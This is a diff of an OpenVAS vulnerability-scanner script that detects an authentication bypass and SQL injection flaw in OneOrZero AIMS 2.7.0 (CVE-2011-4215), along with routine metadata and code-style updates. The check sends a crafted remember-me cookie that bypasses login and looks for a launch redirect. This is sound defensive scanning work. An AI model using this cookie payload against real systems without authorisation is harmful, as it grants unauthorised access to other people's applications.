@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_OneOrZero_50107.nasl 3117 2016-04-19 10:19:37Z benallard $
+# $Id: gb_OneOrZero_50107.nasl 5750 2017-03-28 14:10:17Z cfi $
 #
 # OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities
 #
@@ -33,12 +33,11 @@ modify the logic of SQL queries.
 
 OneOrZero AIMS 2.7.0 is affected; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(103304);
- script_version("$Revision: 3117 $");
- script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
+ script_version("$Revision: 5750 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 16:10:17 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)");
  script_cve_id("CVE-2011-4215");
  script_bugtraq_id(50107);
@@ -53,7 +52,6 @@ if (description)
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/800227");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if installed OneOrZero AIMS is vulnerable");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -67,35 +65,32 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-   
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/ooz",cgi_dirs());
+foreach dir( make_list_unique( "/ooz", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.php"); 
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-  if(http_vuln_check(port:port, url:url,pattern:"Powered by OneOrZero")) {
+  if( "Powered by OneOrZero" >< buf ) {
 
-    host = get_host_name();
+    host = http_host_name( port:port );
 
-    req = string(
-		 "GET /ooz/index.php HTTP/1.1\r\n",
+    req = string("GET ", url, " HTTP/1.1\r\n",
 		 "Host: ", host,"\r\n",
 		 "Cookie: oozimsrememberme=eJwrtjI0tlJKTMnNzMssLilKLMkvUrJ29PQNBgBsjwh2;\r\n",
-		 "\r\n\r\n"
-		 );
-
+		 "\r\n\r\n" );
     res = http_keepalive_send_recv(port:port,data:req);
 
     if("Location: ?controller=launch" >< res) {
-      security_message(port:port);
-      exit(0);
-    }  
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
-exit(0);
+exit( 99 );
